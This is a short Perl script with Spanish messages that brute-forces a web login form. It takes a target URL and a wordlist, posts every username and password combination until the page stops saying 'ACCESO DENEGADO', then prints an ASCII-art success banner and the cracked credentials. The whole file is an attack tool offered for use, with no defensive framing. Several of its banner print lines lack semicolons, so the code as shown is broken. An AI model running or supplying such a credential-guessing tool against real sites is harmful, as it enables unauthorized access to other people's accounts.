# -*- coding: utf-8 -*-
#!/bin/perl


use strict;
use LWP::UserAgent;

 
if ($#ARGV < 1)
{
	print "\nUso: perl FB [URL] [DICCIONARIO]\n";
	print "Ej.: perl FB www.victima.com/login.php 'wordlist.ibs'\n\n";
	exit();
}
 
my $url		= @ARGV[0];
my $fdic	= @ARGV[1];

print $fdic;
open (FILE,$fdic) || die "No se encontró nigún diccionario: $!";
 
my @dic = <FILE>; 
my $ua	= new LWP::UserAgent; 
my $req = new HTTP::Request 'POST',$url;
 
foreach(@dic) 
{
	my $usuario = $_ ;
	chomp($usuario) ;
	
	foreach(@dic) 
	{
		my $password = $_;
		chomp($password);		
		
		$req->content_type('application/x-www-form-urlencoded');
		$req->content("&username=$usuario&password=$password&Submit=Enviar+consulta");
		
		my $res			= $ua->request($req);
		my $respuesta 	= $res->as_string;
		
		print "\nAtacando con [Usuario]:[$usuario] y [Password]:[$password]";
		
		if ($respuesta !~ /ACCESO DENEGADO/)
		{
			
print " ▄▄▄     ▄▄▄█████▓ ▄▄▄        █████   █    ██ ▓█████    ▓█████ ▒██   ██▒ ██▓▄▄▄█████▓ ▒█████    ██████  ▒█████  "
print "▒████▄   ▓  ██▒ ▓▒▒████▄    ▒██▓  ██▒ ██  ▓██▒▓█   ▀    ▓█   ▀ ▒▒ █ █ ▒░▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██    ▒ ▒██▒  ██▒"
print "▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄  ▒██▒  ██░▓██  ▒██░▒███      ▒███   ░░  █   ░▒██▒▒ ▓██░ ▒░▒██░  ██▒░ ▓██▄   ▒██░  ██▒"
print "░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██ ░██  █▀ ░▓▓█  ░██░▒▓█  ▄    ▒▓█  ▄  ░ █ █ ▒ ░██░░ ▓██▓ ░ ▒██   ██░  ▒   ██▒▒██   ██░"
print " ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒░▒███▒█▄ ▒▒█████▓ ░▒████▒   ░▒████▒▒██▒ ▒██▒░██░  ▒██▒ ░ ░ ████▓▒░▒██████▒▒░ ████▓▒░"
print " ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒ ░░ ▒░ ░   ░░ ▒░ ░▒▒ ░ ░▓ ░░▓    ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ "
print "  ▒   ▒▒ ░   ░      ▒   ▒▒ ░ ░ ▒░  ░ ░░▒░ ░ ░  ░ ░  ░    ░ ░  ░░░   ░▒ ░ ▒ ░    ░      ░ ▒ ▒░ ░ ░▒  ░ ░  ░ ▒ ▒░ "
print "  ░   ▒    ░        ░   ▒      ░   ░  ░░░ ░ ░    ░         ░    ░    ░   ▒ ░  ░      ░ ░ ░ ▒  ░  ░  ░  ░ ░ ░ ▒  "
print "      ░  ░              ░  ░    ░       ░        ░  ░      ░  ░ ░    ░   ░               ░ ░        ░      ░ ░  "
                                                                                                                

			print "=======================\n";
			print " Usuario:\t$usuario\n Password:\t$password\n";
			print "=======================\n\n";
			exit();
		}
		else
		{
			print "...... INICIO DE SESION INCORRECTO";
		}
	}
}
